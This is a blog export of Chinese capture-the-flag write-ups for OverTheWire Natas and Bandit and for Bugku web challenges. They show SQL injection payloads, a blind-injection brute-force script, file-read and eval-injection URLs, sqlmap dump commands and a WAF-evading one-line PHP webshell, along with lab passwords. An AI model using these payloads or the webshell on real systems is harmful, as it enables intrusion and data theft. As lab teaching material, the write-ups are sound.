&lt;censored&gt;&lt;br&gt;"; &#125; else &#123; echo "Access denied!&lt;br&gt;"; &#125; mysql_close($link);&#125; else &#123;?&gt;&lt;form action="index.php" method="POST"&gt;Username: &lt;input name="username"&gt;&lt;br&gt;Password: &lt;input name="password"&gt;&lt;br&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;? &#125; ?&gt; 注意的一个关键问题是，如果我们在GET请求中提供了一个’debug’参数，它将回显发送到数据库的确切查询。 用户：username 密码：password 访问：http://natas14.natas.labs.overthewire.org/index.php?username=username&amp;%20password=password&amp;debug 返回： 12Executing query: SELECT * from users where username=&quot;username&quot; and password=&quot;password&quot;Access denied! 用户：” or “1”=”1 密码：password 访问： http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%20%221%22=%221&amp;%20password=password&amp;debug 返回： 12Executing query: SELECT * from users where username=&quot;&quot; or &quot;1&quot;=&quot;1&quot; and password=&quot;password&quot;Access denied! 用户：” or “1”=”1 密码：” or “1”=”1 访问： http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%20%221%22=%221&amp;%20password=%22%20or%20%221%22=%221&amp;debug 返回： 12Executing query: SELECT * from users where username=&quot;&quot; or &quot;1&quot;=&quot;1&quot; and password=&quot;&quot; or &quot;1&quot;=&quot;1&quot;Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 成功登陆并返回密码 Natas Level 14 → Level 151234Username: natas15URL: http://natas15.natas.labs.overthewire.org密码：AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 过程： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?/*CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL);*/if(array_key_exists("username", $_REQUEST)) &#123; $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;'); mysql_select_db('natas15', $link); $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; if(array_key_exists("debug", $_GET)) &#123; echo "Executing query: $query&lt;br&gt;"; &#125; $res = mysql_query($query, $link); if($res) &#123; if(mysql_num_rows($res) &gt; 0) &#123; echo "This user exists.&lt;br&gt;"; &#125; else &#123; echo "This user doesn't exist.&lt;br&gt;"; &#125; &#125; else &#123; echo "Error in query.&lt;br&gt;"; &#125; mysql_close($link);&#125; else &#123;?&gt;&lt;form action="index.php" method="POST"&gt;Username: &lt;input name="username"&gt;&lt;br&gt;&lt;input type="submit" value="Check existence" /&gt;&lt;/form&gt;&lt;? &#125; ?&gt; 经过多次尝试后，这一题是sql盲注，并且存在natas16这个用户，而密码是32个字符，可以用这条查询语句来查寻密码中是否有a。 Select * from username where username =“natas16”and password LIKE BINARY“%a%” 所以用python写一个脚本来爆破出密码 123456789101112131415161718192021import requestsfrom requests.auth import HTTPBasicAuthchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'filtered = ''passwd = ''for char in chars: Data = &#123;'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'&#125; r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data) if 'exists' in r.text : filtered = filtered + charfor i in range(0,32): for char in filtered: Data = &#123;'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'&#125; r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data) if 'exists' in r.text : passwd = passwd + char print(passwd) break 第一个循环是找出密码由哪些字符组成，而第二个双重循环的目的是查出密码，这样更快一点。 1234567891011121314151617181920212223242526272829303132WWaWaIWaIHWaIHEWaIHEaWaIHEacWaIHEacjWaIHEacj6WaIHEacj63WaIHEacj63wWaIHEacj63wnWaIHEacj63wnNWaIHEacj63wnNIWaIHEacj63wnNIBWaIHEacj63wnNIBRWaIHEacj63wnNIBROWaIHEacj63wnNIBROHWaIHEacj63wnNIBROHeWaIHEacj63wnNIBROHeqWaIHEacj63wnNIBROHeqiWaIHEacj63wnNIBROHeqi3WaIHEacj63wnNIBROHeqi3pWaIHEacj63wnNIBROHeqi3p9WaIHEacj63wnNIBROHeqi3p9tWaIHEacj63wnNIBROHeqi3p9t0WaIHEacj63wnNIBROHeqi3p9t0mWaIHEacj63wnNIBROHeqi3p9t0m5WaIHEacj63wnNIBROHeqi3p9t0m5nWaIHEacj63wnNIBROHeqi3p9t0m5nhWaIHEacj63wnNIBROHeqi3p9t0m5nhmWaIHEacj63wnNIBROHeqi3p9t0m5nhmh]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku web writeup]]></title>
    <url>%2F2018%2F04%2F26%2Fbugku-web-writeup%2F</url>
    <content type="text"><![CDATA[持续更新中…… web2直接审查元素找到FLAG 文件上传测试上传一个图片格式的文件，然后burpsuite抓包修改后缀名为PHP得到FLAG 计算器 审查元素，发现最长字符为1，改为大于1，输入答案get FLAG web基础$_GET1234567$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 以get方式获取what参数，假如what=flag就输出flag 构造： http://120.24.86.145:8002/get/?what=flag web基础$_POST1234567$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 以post方式获取what参数，假如what=flag就输出flag 所以POST方式提交what=flag，获得 flag 矛盾12345678910111213$num=$_GET['num'];if(!is_numeric($num)) // is_numeric检测变量是否为数字或数字字符串&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; 即num既不能是数字字符，但是要等于1 我们可以想到用科学计数法表示数字1，既不是纯数字，其值又等于1 因此，构造payload num=1e0.1 或者用%00截断，表单提交?num=1%00，即得到了flag web3查看源码,发现： 1&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 然后进行编码get falg sql注入右键查看源码 1234567891011121314151617181920212223&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="gb2312" /&gt; &lt;title&gt;SQL测试&lt;/title&gt; &lt;link rel="stylesheet" href="http://apps.bdimg.com/libs/bootstrap/3.3.4/css/bootstrap.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container"&gt; &lt;h2&gt;SQL注入测试&lt;/h2&gt; &lt;div class="alert alert-success"&gt; &lt;p&gt;查询key表,id=1的string字段&lt;/p&gt; &lt;/div&gt; &lt;table class="table table-striped"&gt; &lt;tr&gt;&lt;td&gt;id&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;key&lt;/td&gt;&lt;td&gt;fdsafdasfdsa&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入--&gt; &lt;script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt; &lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt; &lt;script src="http://apps.bdimg.com/libs/bootstrap/3.3.4/js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 看到gb2312想到宽字节注入 访问：http://103.238.227.13:10083/?id=1%df%27 返回：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1運’’ LIMIT 1’ at line 1 查询数据库名 sql5 %df%27 union select 1,database()%23 查询string字段 %df%27%20union%20select%201,string%20from%20sql5.key%20where%20id=1%23 54f3320dc261f313ba712eb3f13a1f6d 域名解析听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag，于是我修改/windows/system32/drivers/etc目录下修改host 120.24.86.145 flag.bugku.com 然后直接访问flag.bugku.com 得到flag SQL注入1提示：过滤了关键字 你能绕过他吗 123456789101112//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id); $query = “SELECT * FROM temp WHERE id={$id} LIMIT 1”; strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，那么可以利用这点，在union等敏感字中间加上 &lt;a&gt;，&lt;br&gt;等标签。 或者用%00 查询数据库：sql3 ?id=1 uni&lt;a&gt;on sel&lt;a&gt;ect 1,database()%23 查找表为key的数据表，id=1值hash字段值 ?id=1 uni&lt;a&gt;on sel&lt;a&gt;ect 1,hash fr&lt;a&gt;om sql3.key%23 c3d3c17b4ca7f791f85e#$1cc72af274af4adef 你必须让他停下Burpsuite抓包，发送到Repeater多GO几下get flag 本地包含123456&lt;?php include "flag.php"; // 包含flag.php这个文件 $a = @$_REQUEST['hello']; // $a这个变量请求变量hello的值 eval( "var_dump($a);"); show_source(__FILE__);?&gt; @$_REQUEST 的意思是获得参数，不论是@$_GET还是@$_POST可以得到的参数@$_REQUEST都能得到。 构造一下payload index.php?hello=);print_r(file(&quot;flag.php&quot;) index.php?hello=);var_dump(file(&quot;flag.php&quot;) index.php?hello=file(&quot;flag.php&quot;) 变量1flag In the variable ! //flag在变量中 12345678910111213&lt;?php error_reporting(0); // 关闭php错误显示include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; // 这个正则表达式的意思是匹配任意 [A-Za-z0-9_] 的字符，就是任意大小写字母和0到9以及下划线组成 die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; 首先先了解一下可变变量 而$GLOBALS：一个包含了全部变量的全局组合数组 http://120.24.86.145:8004/index1.php?args=GLOBALS web5JSFuck是基于JavaScript原子部分的深奥和教育编程风格。它只使用六个不同的字符来编写和执行代码。它不依赖于浏览器，所以你甚至可以在Node.js上运行它。 直接把JSfuck代码扔进F12控制台,get flag. 头等舱用Burosuite抓包后扔进Repeater然后Go一下，flag就在返回包的头里。 web4看看源代码，那就看看吧 源码很好理解把俩个变量进行unescape解码，可得到源码，发现password=67d709b2b54aa2aa648cf6e87a7114f1提交就可得到flag flag在index里文件包含，php://filter读取index.php 了解一下PHP伪协议 http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 输入密码查看flag第一反应爆破 用burpsuite的Intruder 点击一百万次F12修改变量var clicks=999999 再点击一下getflag 备份是个好习惯猜测index.php存在备份文件index.php.bak，下载后产看源码，上传key1和key2两个md5相等值不相等的数据即可得到flag，因为会消除一次key故构造kkeyey1[]=1&amp;kkeyey2[]=2即可。 123456789101112include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125; 提交http://120.24.86.145:8002/web16/index.php?kkeyey1[]=1&amp;kkeyey2[]=2 成绩单提交一个参数后，看到id，于是想到注入 首先查询数据库skctf_flag id=-1&#39; union select database(),1,2,3# 查表 fl4g,sc MySql采用GROUP_CONCAT合并多条数据显示的方法 id=-1&#39; union select 1,GROUP_CONCAT(table_name),3,4 from information_schema.tables where TABLE_SCHEMA=&#39;skctf_flag&#39;# 查字段 skctf_flag id=-1&#39; union select 1,GROUP_CONCAT(column_name),3,4 from information_schema.columns where TABLE_name=&#39;fl4g&#39;# 查flag id=-1&#39; union select 1,2,3,group_concat(skctf_flag) from fl4g# 秋名山老司机直接上脚本 1234567891011121314# -*- coding: UTF-8 -*-import requestsfrom bs4 import BeautifulSoupurl = "http://120.24.86.145:8002/qiumingshan/"r = requests.session()html = r.get(url).textsoup = BeautifulSoup(html, 'html.parser')res = soup.select("div")[0].text.split('=',1)[0] # 匹配出表达式c = eval(res) # 计算结果data = &#123;'value': c&#125;html= r.post(url,data)print (html.text) python 的內建方法 eval() 来计算出结果 速度要快最开始我直接用hackbar提交，提示速度要更快，用Burpsuite抓包，返回头里面有flag，base64解码后发现不对，于是上脚本 123456789101112# -*- coding: UTF-8 -*-import requestsimport base64url =&apos;http://120.24.86.145:8002/web6/&apos;r = requests.session()header = r.get(url).headersflag = base64.b64decode(header[&apos;flag&apos;]) # 获取响应头中的flag并Base64解码c = base64.b64decode(str(flag, encoding=&apos;utf-8&apos;).split(&apos; &apos;,1)[1]) # 取出flag的值后再次base64解码data = &#123;&apos;margin&apos;: c&#125;html= r.post(url,data)print (html.text) 运行脚本直接返回flag 最开始还是得不到flag，后来看别人的wp后才知道还要进行一次base64解码 cookies欺骗filename参数是个base64编码的参数，解码得到keys.txt，所以猜测文件名是以base64的方式进行传播的所以把index.php以base64编码的格式传入，而line表示读取哪一行的数据，然后写个脚本遍历line参数的值可得出源码 123456import requestsa = 40 # 实际没有40行for i in range(a): url = &quot;http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&quot; %i r = requests.get(url) print (r.text) 源码如下 1234567891011121314151617&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 构造Cookie: margin=margin 读取keys.php获得flag 请求： 12345678910GET /web11/index.php?line=&amp;filename=a2V5cy5waHA= HTTP/1.1Host: 120.24.86.145:8002User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://ctf.bugku.com/challengesConnection: closeCookie: margin=marginUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 XSS首先测试&lt;script&gt;alert(_key_)&lt;/script&gt;，发现被直接返回了 查看源码发现 var s=&quot;&amp;lt;script&amp;gt;alert(_key_)&amp;lt;/script&amp;gt;&quot;; document.getElementById(&#39;s&#39;).innerHTML = s; 左右尖括号被转译了，所以只需要将&lt;&gt;进行Unicode编码即可 payload ?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e 源码中找到flag never give up最开始傻傻以为注入，后来查看源码发现1p.html文件，直接访问会跳转的首页，直接查看源码，发现一串Base64，所以先Base解码，再Url解码，得到最后的源码，发现f4l2a3g.txt文件，于是直接访问一下得到flag welcome to bugkuctf查看源码有提示 123456789101112&lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 明白了: get方式传递三个参数 存在$user 读取的$user文件内容===welcome to the bugkuctf $file要求为hint.php 于是想到了PHP://filter与php://input，参考链接 于是构造payload http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password= 同时post data填入welcome to the bugkuctf，成功得到源码 hint.php源码： 123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 同样的方法获得index.php源码 1234567891011121314151617181920212223242526272829303132&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 其中有一个很重要的函数unserialize（） 参考链接： http://www.runoob.com/php/php-filtered-unserialize.html https://ciphersaw.me/2018/01/03/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20welcome%20to%20bugkuctf/ 创建一个本地php文件 123456789&lt;?phpclass Flag&#123; public $file;&#125;$a = new Flag();$a-&gt;file = "flag.php";$a = serialize($a);print_r($a);?&gt; 返回结果O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 于是构造http://120.24.86.145:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 最后别忘了在请求主体中提交字符串 welcome to the bugkuctf 字符？正则？跟着上面的式子一点一点分析，一点一点构造 payload ?id=key4key11111key:/8/akeyz: 过狗一句话送给大家一个过狗一句话 1&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 直接利用这个马，用assert执行任意代码 http://120.24.86.145:8010/?s=print_r(scandir(%27./%27)); 列目录 scandir() 函数返回指定目录中的文件和目录的数组 直接访问flag.txt获得flag 前女友(SKCTF)进去 题目后发现发现code.txt文件 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 意思是$v1不等于$v2，但是md5($v1)等于md5($v2)，$v3不等于$flag 查看php MD5()漏洞与PHP strcmp漏洞，strcmp不能比较数组，所以返回假 于是构造 /index.php?v1[]=1&amp;v2[]=2&amp;v3[]=1 login1(SKCTF)做题之前先看看这篇文章-&gt;链接 看完值后豁然开朗 这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。 你从哪里来首先了解Http协议中的referer表示的就是你从哪个页面来的 用burp suite抓包，手动添加 referer: https://www.google.com，然后重放一下就得到flag 各种绕过123456789101112131415161718&lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125; 分析一下源码，首先要存在参数id并且等于margin，同时存在参数uname和passwd，passwd参数以POST方式提交，uname和passwd的值不等，但是sha1（）后相等，此时利用php sha1()函数漏洞.-&gt;参考链接 web8123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; file_get_contents()函数是把整个文件读入一个字符串中，而$ac的值等于文件$fn中的内容就打印出flag 找了一下,存在一个flag.txt的文件，内容是flags所以构造payload ?ac=flags&amp;fn=flag.txt 细心刚以进去很懵，什么鬼404，后来看了一下robots.txt 12User-agent: *Disallow: /resusl.php 访问一下 123By bugkuctf.if ($_GET[x]==$password) 此处省略1w字 还是很懵，看了其他大佬的writeup 构造 http://120.24.86.145:8002/web13/resusl.php?x=admin get flag 。。。。。。 求getshell尝试00截断绕过+修改content-type都不行，看了wp才知道。 php别名：php2, php3, php4, php5, phps, pht, phtm, phtml 这题用php5绕过，http头中的Content-type的值大小写可以绕过。 图片的Content-type改成：image/jpeg 这是一个神奇的登陆框post提交，尝试注入，由于post提交，我Burpsuite+sqlmap结合使用 首先burp抓包，抓到包后选择存到txt文件中 sqlmap -r &quot;F:\Code\py\1.txt&quot; -p admin_name --dbs 解释一下 -r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（选了admin_name是注入点） –dbs意思是想获取数据库名字 数据库：bugkusql1 继续爆表：sqlmap -r &quot;F:\Code\py\1.txt&quot; -p admin_name -D &quot;bugkusql1&quot; --tables 表：flag1 继续爆列名：sqlmap -r &quot;F:\Code\py\1.txt&quot; -p admin_name -D &quot;bugkusql1&quot; -T &quot;flag1&quot; --columns 最后爆字段： sqlmap -r &quot;F:\Code\py\1.txt&quot; -p admin_name -D &quot;bugkusql1&quot; -T &quot;flag1&quot; -C &quot;flag1&quot; --dump]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Bugku</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OverTheWire-Bandit]]></title>
    <url>%2F2018%2F04%2F23%2FOverTheWire-Bandit%2F</url>
    <content type="text"><![CDATA[OverTheWire-Bandit 1-27官网：http://overthewire.org/wargames/bandit/ 强盗战争是针对绝对的初学者。它将教授需要能够玩其他战争游戏的基础知识，通过这个游戏能学习到很多Linux的基础知识。和大多数其他游戏一样，这个游戏按层次组织。你从0级开始尝试“击败”或“完成”它。完成一个关卡会产生关于如何开始下一关的信息。本网站上的“Level ”页面包含有关如何从上一级开始X级的信息。 这个游戏有27关，对应27对账号密码组合。开始的时候送我们一个第一关的账号密码：「bandit0」-「bandit0」。我们需要使用这个账号登陆服务器并找到「bandit1」的密码，然后使用得到的密码登陆「bandit1」，再找到「bandit2」的密码…… Level 0这个级别的目标是让你使用SSH登录游戏。您需要连接的主机是 bandit.labs.overthewire.org，端口2220.用户名是bandit0，密码是bandit0。登录后，进入1级页面，了解如何击败1级。 我用的是XShell直接按提示输入账号密码，连接成功，进入下一级 Level 0 → Level 1描述：下一级别的密码存储在位于主目录中的名为readme的文件 中。使用此密码使用SSH登录bandit1。只要你找到一个级别的密码，使用SSH（在端口2220）登录到该级别，并继续游戏。 过程： 1234bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 ls命令列出当前目录下的文件，而用cat命令查看文件内容 密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 1 → Level 2用账号：bandit1 ，密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1进入本关 描述：下一级的密码存储在一个名为- ，位于主目录中的文件中 过程： 1234bandit1@bandit:~$ ls-bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 文件名是:”-“，如果是其他名字直接 cat filename 就行了，如果是 “cat - “的话，就有一些小问题，因为 bash 中会用”-“来接受命令行参数，未避免冲突，我们使用”./“来表示当前目录，那”-“文件就表示为”./-“。 密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level 2→ Level 3用账号：bandit2 ，密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9进入本关 描述：下一级别的密码存储在位于主目录中的文件名为spaces in this filename 过程： 1234bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ cat spaces\ in\ this\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK “ls”查看文件，注意spaces in this filename是一个文件，而不是四个，虽然文件名存在空格，但是Linux有自动补全的功能，输入”cat s”后，按一下Tab键就自动补全了 密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level 3 → Level 4用账号：bandit3 ，密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK进入本关 描述：下一级别的密码存储在inhere目录中的隐藏文件中 。 过程： 12345678bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -a. .. .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB “ls -a”显示所有文件及目录 (ls内定将文件名或目录名称开头为”.”的视为隐藏档，不会列出),”.”开头的文件为隐藏文件，故”ls”没有列出 密码：pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level 4→ Level 5用账号：bandit4 ，密码：pIwrPrtPN36QITSp3EQaw936yaFoFgAB进入本关 描述：下一级别的密码存储在inhere目录中唯一的人类可读文件中。提示：如果你的终端搞砸了，试试“重置”命令。 过程： 12345678910111213141516171819bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh inhere文件夹中存在10个文件，用Linux的”file”命令辨识文件类型，”*”是通配符，只有”-file07”文件类型不一样，八九不离十就是它了。 密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level 5→ Level 6用账号：bandit5，密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh进入本关 描述：下一级别的密码存储在inhere目录下的某个文件中，并具有以下所有属性：人类可读，大小为1033字节，不可执行 过程： 1234567891011121314151617181920212223242526272829bandit5@bandit:~$ lsinherebandit5@bandit:~$ cd inhere/bandit5@bandit:~/inhere$ ls -ltotal 80drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere00drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere01drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere02drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere03drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere04drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere05drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere06drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere07drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere08drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere09drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere10drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere11drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere12drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere13drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere14drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere15drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere16drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere17drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere18drwxr-x--- 2 root bandit5 4096 Dec 28 14:34 maybehere19bandit5@bandit:~/inhere$ find . -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 “ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes 密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level 6→ Level 7用账号：bandit6，密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7进入本关 描述：下一级别的密码存储在服务器的某个位置，并具有以下所有属性：由用户bandit7拥有，由groupitit6拥有，大小为33个字节 过程： 1234bandit6@bandit:~$ find / -group bandit6 -user bandit7 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs “/“ linux 根目录,从最顶层开始查找，”2&gt;/dev/null”中”2”表示错误输出，”&gt;”是重定向符号表示把信息送到哪里，”/dev/null”是Linux黑洞. 密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level 7→ Level 8用账号：bandit7，密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs进入本关 描述：下一级的密码存储文件data.txt中， “millionth” 的下一个单词。 过程： 1234bandit7@bandit:~$ lsdata.txtbandit7@bandit:~$ grep millionth data.txt millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV 命令讲解”grep match_pattern file_name” ,在文件中搜索一个单词，命令会返回一个包含“match_pattern”的文本行 密码：cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level 8→ Level 9用账号：bandit8，密码：cvX2JJa4CFALtqS87jk27qwqGhBM9plV进入本关 